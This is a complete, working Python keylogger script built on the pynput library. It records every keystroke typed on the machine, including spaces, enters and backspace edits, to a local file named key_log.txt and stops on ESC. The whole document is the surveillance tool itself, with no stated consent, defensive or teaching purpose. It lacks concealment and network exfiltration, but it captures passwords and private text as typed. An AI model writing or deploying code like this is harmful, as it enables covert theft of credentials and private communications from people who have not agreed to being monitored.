from pynput import keyboard

# File to store logged keys
log_file = "key_log.txt"

# Initialize a string to store logged characters
logged_data = ""

# Function to write keystrokes to a file
def on_press(key):
    global logged_data
    try:
        if key.char:  # Ensure that key.char is not None
            logged_data += key.char
    except AttributeError:
        # Handle special keys like space, backspace, enter, etc.
        if key == keyboard.Key.space:
            logged_data += " "
        elif key == keyboard.Key.enter:
            logged_data += "\n"
        elif key == keyboard.Key.backspace:
            logged_data = logged_data[:-1]  # Remove the last character
        # Add handling for other special keys if needed, or skip them

    # Write the updated logged data to the file
    with open(log_file, "w") as log:
        log.write(logged_data)

# Function to stop the keylogger (optional, stops on ESC key)
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Listener for keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
